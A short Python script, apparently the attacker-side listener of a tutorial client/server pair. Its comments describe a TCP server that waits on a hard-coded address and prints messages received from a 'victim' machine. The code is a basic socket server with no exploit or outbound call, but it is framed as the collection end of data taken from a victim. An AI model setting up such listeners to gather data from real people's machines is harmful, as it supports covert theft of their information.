import socket                               # socket library is used to establish the connection between the client(victim) and server(attacker)

attacker_address=('192.168.1.5',8000)       # change ip address of server/attacker

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as attacker_socket: # "with" statement will automatically close the socket after the execution of the block

                                            # AF_INET for ipv4 
                                            # SOCK_STREAM for TCP connection (SOCK_DGRAM for UDP connection)

    attacker_socket.bind(attacker_address)  # bind the attacker's ip address and port number to the socket
    
    attacker_socket.listen(1)               # listens only one connection at a time "listen(1)"

    while True:                             # infinite loop to accept the connection and message from the victim
        
        connection,victim_address=attacker_socket.accept()  # accept the connection from the victim
       
        with connection:                  
            
            while True:                     # infinite loop to receive the message from the victim continuosly
             
                data=connection.recv(1024)  # receive the message (size of 1024 byte) from the victim
             
                if not data:                # if no data is received, then it will break the loop
                    break
             
                print(data.decode('utf-8')) # Decode and print the message received from the victim in utf-8 format